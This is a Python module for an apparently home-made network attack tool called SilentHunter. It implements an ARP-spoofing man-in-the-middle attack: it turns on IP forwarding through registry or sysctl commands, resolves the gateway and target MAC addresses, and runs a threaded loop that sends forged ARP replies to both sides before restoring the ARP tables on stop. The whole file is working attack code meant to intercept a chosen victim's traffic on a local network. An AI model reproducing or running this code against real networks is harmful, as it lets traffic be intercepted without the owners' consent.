# SilentHunter_funcs.py (IMPROVED VERSION)
# Core MITM attack functions with enhanced reliability

import time
import sys
from scapy.all import *
from scapy.config import conf
import scapy.all as scapy
import subprocess
import platform
import re
import threading
import SilentHunter_GUI as GUI

# Configure Scapy for Windows compatibility
scapy.conf.use_pcap = True
if platform.system() == "Windows":
    try:
        scapy.conf.use_winpcapy = True
    except:
        pass

# Global variables for attack state
gateway_ip = None
target_ip = None
attack_running = False
attack_thread = None

def c_print(text):
    """Centralized printing through GUI"""
    GUI.c_print(text)

# ============================================================================
# IP FORWARDING CONTROL
# ============================================================================

def enable_ip_forwarding():
    """
    Enable IP forwarding to allow traffic to pass through
    Required for MITM to work properly
    """
    system = platform.system()
    
    try:
        if system == "Windows":
            # Windows: Enable IP routing
            subprocess.run(
                ['reg', 'add', 
                 'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters',
                 '/v', 'IPEnableRouter', '/t', 'REG_DWORD', '/d', '1', '/f'],
                capture_output=True
            )
            c_print("[+] IP forwarding enabled (Windows)")
            
        elif system == "Linux":
            # Linux: Enable IP forwarding
            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], 
                         capture_output=True)
            c_print("[+] IP forwarding enabled (Linux)")
            
        elif system == "Darwin":  # macOS
            subprocess.run(['sysctl', '-w', 'net.inet.ip.forwarding=1'],
                         capture_output=True)
            c_print("[+] IP forwarding enabled (macOS)")
            
        return True
        
    except Exception as e:
        c_print(f"[!] Could not enable IP forwarding: {e}")
        c_print("[!] MITM may not work properly without IP forwarding")
        return False

def disable_ip_forwarding():
    """Disable IP forwarding after attack"""
    system = platform.system()
    
    try:
        if system == "Windows":
            subprocess.run(
                ['reg', 'add',
                 'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters',
                 '/v', 'IPEnableRouter', '/t', 'REG_DWORD', '/d', '0', '/f'],
                capture_output=True
            )
            c_print("[+] IP forwarding disabled (Windows)")
            
        elif system == "Linux":
            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'],
                         capture_output=True)
            c_print("[+] IP forwarding disabled (Linux)")
            
        elif system == "Darwin":
            subprocess.run(['sysctl', '-w', 'net.inet.ip.forwarding=0'],
                         capture_output=True)
            c_print("[+] IP forwarding disabled (macOS)")
            
    except Exception as e:
        c_print(f"[!] Could not disable IP forwarding: {e}")

# ============================================================================
# GATEWAY AND MAC DETECTION
# ============================================================================

def get_gateway_ip():
    """
    Enhanced gateway detection with multiple methods
    """
    system = platform.system()
    gateway = None
    
    try:
        if system == "Windows":
            # Method 1: Try ipconfig
            result = subprocess.run(['ipconfig'], 
                                  capture_output=True, 
                                  text=True, 
                                  encoding='utf-8', 
                                  errors='ignore')
            lines = result.stdout.split('\n')
            
            for line in lines:
                # Support both English and Vietnamese
                if 'Default Gateway' in line or 'Cổng mặc định' in line:
                    ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                    if ip_match:
                        gateway = ip_match.group(1)
                        # Skip empty gateways
                        if gateway and gateway != '0.0.0.0':
                            break
                        gateway = None
            
            # Method 2: Try route print if ipconfig failed
            if not gateway:
                result = subprocess.run(['route', 'print', '0.0.0.0'],
                                      capture_output=True,
                                      text=True,
                                      encoding='utf-8',
                                      errors='ignore')
                lines = result.stdout.split('\n')
                for line in lines:
                    if '0.0.0.0' in line:
                        parts = line.split()
                        # Gateway is typically the 3rd or 4th field
                        for part in parts:
                            if re.match(r'\d+\.\d+\.\d+\.\d+', part):
                                if part != '0.0.0.0' and not part.startswith('255.'):
                                    gateway = part
                                    break
                        if gateway:
                            break
        else:
            # Linux/Mac: Use ip route or netstat
            try:
                result = subprocess.run(['ip', 'route', 'show', 'default'],
                                      capture_output=True, text=True)
                match = re.search(r'default via (\d+\.\d+\.\d+\.\d+)', result.stdout)
                if match:
                    gateway = match.group(1)
            except:
                # Fallback to netstat
                result = subprocess.run(['netstat', '-rn'], 
                                      capture_output=True, text=True)
                lines = result.stdout.split('\n')
                for line in lines:
                    if '0.0.0.0' in line or 'default' in line:
                        parts = line.split()
                        for part in parts:
                            ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', part)
                            if ip_match and part != '0.0.0.0':
                                gateway = ip_match.group(1)
                                break
        
        if gateway:
            c_print(f"[+] Gateway detected: {gateway}")
        else:
            c_print("[!] Could not detect gateway automatically")
            c_print("[*] You may need to enter it manually")
            
    except Exception as e:
        c_print(f"[!] Gateway detection error: {e}")
    
    return gateway

def get_mac(ip, retry=3, timeout=3):
    """
    Enhanced MAC address resolution with retry logic
    """
    c_print(f"[*] Resolving MAC for: {ip}")
    
    for attempt in range(retry):
        try:
            # Create ARP request
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            
            # Send and wait for response
            answered_list = srp(arp_request_broadcast, 
                              timeout=timeout, 
                              verbose=False,
                              retry=2)[0]
            
            if answered_list:
                mac = answered_list[0][1].hwsrc
                c_print(f"[+] MAC found: {ip} -> {mac}")
                return mac
            else:
                if attempt < retry - 1:
                    c_print(f"[*] Retry {attempt + 1}/{retry}...")
                    time.sleep(1)
                    
        except Exception as e:
            c_print(f"[!] Error on attempt {attempt + 1}: {e}")
            if attempt < retry - 1:
                time.sleep(1)
    
    c_print(f"[-] Could not resolve MAC for {ip} after {retry} attempts")
    return None

# ============================================================================
# TARGET MANAGEMENT
# ============================================================================

def set_target_ip(ip):
    """Set and validate target IP"""
    global target_ip
    
    # Basic IP validation
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if not ip_pattern.match(ip):
        c_print(f"[!] Invalid IP format: {ip}")
        return False
    
    # Check if IP is reachable
    c_print(f"[*] Validating target: {ip}")
    mac = get_mac(ip)
    
    if mac:
        target_ip = ip
        c_print(f"[+] Target set: {ip} ({mac})")
        return True
    else:
        c_print(f"[!] Cannot reach target: {ip}")
        c_print("[!] Target not set")
        return False

# ============================================================================
# ARP OPERATIONS
# ============================================================================

def restore_arp(destination_ip, source_ip, count=5):
    """
    Enhanced ARP restoration with multiple packets
    """
    c_print(f"[*] Restoring ARP: {destination_ip} <-> {source_ip}")
    
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    
    if not destination_mac or not source_mac:
        c_print(f"[!] Cannot restore ARP - MAC resolution failed")
        return False
    
    try:
        # Create correct ARP reply
        packet = ARP(
            op=2,                      # ARP reply
            pdst=destination_ip,       # Destination IP
            hwdst=destination_mac,     # Destination MAC
            psrc=source_ip,            # Source IP (real one)
            hwsrc=source_mac           # Source MAC (real one)
        )
        
        # Send multiple packets to ensure restoration
        send(packet, count=count, verbose=False)
        c_print(f"[+] ARP restored: {destination_ip} knows {source_ip} is at {source_mac}")
        return True
        
    except Exception as e:
        c_print(f"[!] ARP restoration error: {e}")
        return False

def spoof_arp(target_ip, spoof_ip):
    """
    Send spoofed ARP packet
    Returns True if successful
    """
    target_mac = get_mac(target_ip)
    
    if not target_mac:
        return False
    
    try:
        # Create malicious ARP reply
        packet = ARP(
            op=2,                  # ARP is-at (reply)
            pdst=target_ip,        # Target IP
            hwdst=target_mac,      # Target MAC
            psrc=spoof_ip          # Pretend to be this IP
        )
        
        send(packet, verbose=False)
        return True
        
    except Exception as e:
        c_print(f"[!] ARP spoof error: {e}")
        return False

# ============================================================================
# CONNECTIVITY TESTING
# ============================================================================

def test_connectivity():
    """
    Comprehensive connectivity test
    """
    global gateway_ip, target_ip
    
    # Initialize gateway if needed
    if not gateway_ip:
        gateway_ip = get_gateway_ip()
    
    if not gateway_ip:
        c_print("[!] No gateway detected")
        return False
    
    if not target_ip:
        c_print("[!] No target set")
        return False
    
    c_print("\n[*] Testing network connectivity...")
    c_print("─" * 50)
    
    # Test gateway
    c_print(f"[*] Testing gateway: {gateway_ip}")
    gw_mac = get_mac(gateway_ip)
    if gw_mac:
        c_print(f"[+] Gateway reachable: {gw_mac}")
    else:
        c_print(f"[!] Cannot reach gateway")
        return False
    
    # Test target
    c_print(f"[*] Testing target: {target_ip}")
    target_mac = get_mac(target_ip)
    if target_mac:
        c_print(f"[+] Target reachable: {target_mac}")
    else:
        c_print(f"[!] Cannot reach target")
        return False
    
    c_print("─" * 50)
    c_print("[+] Connectivity test PASSED")
    return True

# ============================================================================
# MITM ATTACK CONTROL
# ============================================================================

def mitm_attack_loop():
    """Main MITM attack loop running in separate thread"""
    global attack_running, target_ip, gateway_ip
    
    sent_packets = 0
    error_count = 0
    max_errors = 5
    
    c_print("[*] Attack loop started")
    
    try:
        while attack_running:
            # Spoof target (tell target we are gateway)
            success1 = spoof_arp(target_ip, gateway_ip)
            # Spoof gateway (tell gateway we are target)
            success2 = spoof_arp(gateway_ip, target_ip)
            
            if success1 and success2:
                sent_packets += 2
                error_count = 0  # Reset error counter on success
                
                # Update display every 10 packets
                if sent_packets % 10 == 0:
                    c_print(f"\r[*] Packets sent: {sent_packets}", end="")
                    sys.stdout.flush()
            else:
                error_count += 1
                c_print(f"\n[!] Failed to send spoofed packets (errors: {error_count})")
                
                if error_count >= max_errors:
                    c_print(f"\n[!] Too many errors ({max_errors}), stopping attack")
                    break
            
            time.sleep(2)  # Wait between spoofing cycles
            
    except Exception as e:
        c_print(f"\n[!] Attack loop error: {e}")
    finally:
        c_print(f"\n[*] Attack loop ended - Total packets: {sent_packets}")

def start_MiTM_attack(target_ip_param=None):
    """
    Start MITM attack with all safety checks
    """
    global gateway_ip, target_ip, attack_running, attack_thread
    
    # Use parameter or global target
    if target_ip_param:
        target_ip = target_ip_param
    
    # Ensure gateway is detected
    if not gateway_ip:
        gateway_ip = get_gateway_ip()
        if not gateway_ip:
            c_print("[!] Cannot start: No gateway detected")
            return False
    
    if not target_ip:
        c_print("[!] Cannot start: No target set")
        return False
    
    # Test connectivity first
    if not test_connectivity():
        c_print("[!] Connectivity test failed")
        return False
    
    # Enable IP forwarding
    if not enable_ip_forwarding():
        c_print("[!] Warning: IP forwarding may not be enabled")
    
    # Display attack info
    c_print("\n" + "="*60)
    c_print("STARTING MITM ATTACK")
    c_print("="*60)
    c_print(f"Target:  {target_ip}")
    c_print(f"Gateway: {gateway_ip}")
    c_print(f"Mode:    ARP Spoofing")
    c_print("="*60)
    c_print("\n[!] Press Ctrl+C or use 'stop_attack' command to stop")
    c_print("[*] Starting attack thread...")
    
    # Start attack in separate thread
    attack_running = True
    attack_thread = threading.Thread(target=mitm_attack_loop, daemon=True)
    attack_thread.start()
    
    c_print("[+] MITM attack is running")
    return True

def stop_MiTM_attack():
    """
    Stop MITM attack and cleanup
    """
    global attack_running, attack_thread, target_ip, gateway_ip
    
    if not attack_running:
        c_print("[*] No active attack to stop")
        return
    
    c_print("\n[*] Stopping MITM attack...")
    attack_running = False
    
    # Wait for attack thread to finish
    if attack_thread and attack_thread.is_alive():
        c_print("[*] Waiting for attack thread to finish...")
        attack_thread.join(timeout=5)
    
    # Restore ARP tables
    if target_ip and gateway_ip:
        c_print("[*] Restoring ARP tables...")
        restore_arp(target_ip, gateway_ip, count=5)
        restore_arp(gateway_ip, target_ip, count=5)
        c_print("[+] ARP tables restored")
    
    # Disable IP forwarding
    disable_ip_forwarding()
    
    c_print("[+] MITM attack stopped successfully")

# ============================================================================
# INITIALIZATION
# ============================================================================

# Auto-detect gateway on module import
gateway_ip = get_gateway_ip()